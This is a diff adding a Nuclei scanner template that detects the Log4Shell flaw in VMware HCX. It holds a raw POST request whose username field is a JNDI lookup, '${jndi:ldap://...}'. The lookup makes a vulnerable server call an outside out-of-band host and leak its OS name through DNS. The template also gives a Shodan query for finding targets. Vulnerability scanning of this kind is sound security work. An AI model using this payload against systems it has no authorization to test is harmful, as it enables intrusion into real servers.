@@ -1,0 +1,40 @@
+id: vmware-hcx-log4j
+info:
+  author: pussycat0x,DhiyaneshDK
+  metadata:
+    shodan-query: title:"VMware HCX"
+    verified: true
+  name: VMware HCX - Remote Code Execution (Apache Log4j)
+  reference:
+  - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
+  - https://logging.apache.org/log4j/2.x/security.html
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  severity: critical
+  tags: cve,cve2021,rce,jndi,log4j,vmware
+requests:
+- extractors:
+  - kval:
+    - interactsh_ip
+    type: kval
+  - group: 1
+    part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+  - part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+
+    type: regex
+  matchers-condition: and
+  raw:
+  - "POST /hybridity/api/sessions HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\
+    \ (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: application/json\n\
+    Accept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type:\
+    \ application/json\nOrigin: {{BaseURL}}\n\n{\n  \"authType\": \"password\",\n\
+    \  \"username\": \"${jndi:ldap://${sys:os.name}.{{interactsh-url}}}\",\n  \"password\"\
+    : \"admin\"\n}\n"
